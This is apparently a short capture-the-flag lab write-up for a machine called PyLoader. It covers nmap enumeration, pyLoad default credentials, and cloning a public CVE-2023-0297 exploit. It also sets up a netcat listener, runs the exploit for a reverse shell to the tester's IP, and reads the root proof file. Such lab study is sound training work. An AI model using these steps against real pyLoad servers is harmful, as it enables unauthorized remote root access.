# PyLoader

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.152.26

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://192.168.152.26:9666/
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Cheroot/8.6.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22

```shell
# Check authentication methods on port 22
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.152.26

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 9666

Navigating to port 9666 with Firefox, we find the login page of the pyLoad application. The default credentials are pyload:pyload.

Continuing our search on Google, we found a public exploit for this service (CVE-2023-0297), so we downloaded it to our machine.

## Initial Access

We download the exploit to our machine and open a listener before executing it to receive a reverse shell.

```shell
# Repository
git clone https://github.com/JacobEbben/CVE-2023-0297.git
cd CVE-2023-0297

# Listener
rlwrap -cAra nc -vnlp 443

# Exploit
python exploit.py -t http://192.168.152.26:9666 -I 192.168.45.242 -P 443 -c id
```

## Post-Exploitation

With root privileges, we capture the target's flags.

```shell
# Evidence
cat /root/proof.txt
```
